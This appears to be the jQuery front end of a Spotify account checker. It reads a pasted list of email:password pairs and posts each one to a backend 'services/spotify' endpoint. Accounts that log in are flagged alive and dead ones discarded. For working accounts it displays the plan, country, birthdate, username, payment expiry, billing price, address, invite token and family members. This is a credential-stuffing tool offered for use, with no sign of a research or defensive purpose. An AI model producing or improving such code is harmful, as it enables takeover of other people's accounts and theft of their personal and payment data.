var splited;
$( document ).ready(function() {
    $("#submitForm").click(function(){
        var textArea = $("#accounts").val();
        splited = textArea.split("\n").map(e=>e.split(' ')[0]).filter(e=>validateEmail(e.split(':')[0]));
        promises(splited,0);
        console.log("splited",splited);

    });
});

function promises(arr,i){
    if(i === arr.length)
        return;
    $.post(
        {
            type:'POST',
            url:'services/spotify',
            contentType: 'application/json',
            data: JSON.stringify({
                login:arr[i].split(":")[0],
                password:arr[i].split(":")[1]
            }),
            success: function(data) {
                promises(arr,i+1);
                console.log('post success');
                console.log(JSON.stringify(data));
                prependerModified(data);
            },
            error: function(data) {
                promises(arr,i+1);
                console.log('post error');
                console.log(JSON.stringify(data));
            }
        }
    )
    $('#progressBar').css('width',(i+1) / splited.length * 100 +"%");

}

function prepender(account) {
    var email=account.accountLogin.email ,
        password = account.accountLogin.password, el;
    if(account.validAccount){
        var
            plan = account.accountInfo.plan,
            country = account.accountInfo.country,
            gender= account.accountInfo.gender,
            accountDayAge = account.accountInfo.accountDayAge,
            isTrialUser = account.accountInfo.isTrialUser,
            username=account.accountInfo.username,
            birthdate = account.accountInfo.birthdate,
            third_party_email=account.accountInfo.third_party_email;
        if(!account.accountInfo.paymentInfo){
            el = '<li><span class="aliveAccount">'+email+':'+password+'</span> username: '+username+' isTrial:'+isTrialUser+' plan :'+plan+' gender: '+gender+' birthdate: '+birthdate+' third_party_email: '+third_party_email+' accountDayAge: '+accountDayAge+'</li>';
        }else if(account.accountInfo.paymentInfo){
            var paymentMethod = account.accountInfo.paymentInfo.paymentMethod,
                expires = account.accountInfo.paymentInfo.expires,
                nextBill = account.accountInfo.paymentInfo.nextBill,
                price = account.accountInfo.paymentInfo.price;
            el  = '<li><span class="aliveAccount">'+email+':'+password+'</span>>plan :'+plan+' country:'+country+ 'payment Method :' +paymentMethod+ 'expires:'+ expires + 'next bill :'+nextBill+' price: '+price+' accountDayAge: '+accountDayAge+' isTrialUser :'+isTrialUser+' gender: '+gender+' birthdate: '+birthdate+' third_party_email: '+third_party_email+'</li>';
        }
    }else {
        el = '<li class="deadAccount">'+email+':'+password+' usename: '+username+'</li>'
    }

    $("#checkResultList").prepend(el);
}



function prependerModified(account) {
    var
        email = account.accountLogin.email,
        password = account.accountLogin.password,
        plan = 'X',
        country = 'X',
        accountDayAge = 'X',
        isTrialUser = 'X',
        username = 'X',
        birthdate = 'X',
        third_party_email = 'X',
        expires = 'X',
        nextBill = 'X',
        price = 'X',
        inviteToken = 'X',
        address = 'X',
        maxCapacity = 'X',
        members = 'X'
    ;

    if (account.validAccount) {
        plan = account.accountInfo.plan;
        country = account.accountInfo.country;
        accountDayAge = account.accountInfo.accountDayAge;
        isTrialUser = account.accountInfo.isTrialUser;
        username = account.accountInfo.username;
        birthdate = account.accountInfo.birthdate;
        third_party_email = account.accountInfo.third_party_email;
        if (account.accountInfo.paymentInfo) {
            expires = account.accountInfo.paymentInfo.expires;
            nextBill = account.accountInfo.paymentInfo.nextBill;
            price = account.accountInfo.paymentInfo.price;
            inviteToken = account.accountInfo.inviteToken;
            address = account.accountInfo.address;
            maxCapacity = account.accountInfo.address;
        }
        if (account.accountInfo.members) {
            members = '<ul>';
            for (var i = 0; i < account.accountInfo.members.length; i++)
                members += '<li>name: ' + account.accountInfo.members[i].name + '</li>';
            members += '</ul>';
        }

}
        $('tbody').prepend('<tr>' +
            '      <th scope="row">' + account.validAccount + '</th>' +
            '      <td>' + email + '</td>' +
            '      <td>' + password + '</td>' +
            '      <td>' + plan + '</td>' +
            '      <td>' + country + '</td>' +
            '      <td>' + accountDayAge + '</td>' +
            '      <td>' + isTrialUser + '</td>' +
            '      <td>' + username + '</td>' +
            '      <td>' + birthdate + '</td>' +
            '      <td>' + third_party_email + '</td>' +
            '      <td>' + expires + '</td>' +
            '      <td>' + nextBill + '</td>' +
            '      <td>' + price + '</td>' +
            '      <td>' + inviteToken + '</td>' +
            '      <td>' + address + '</td>' +
            '      <td>' + maxCapacity + '</td>' +
            '      <td>' + members + '</td>' +
            '    </tr>')

}
function validateEmail(email) {
    const re = /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
    return re.test(String(email).toLowerCase());
}
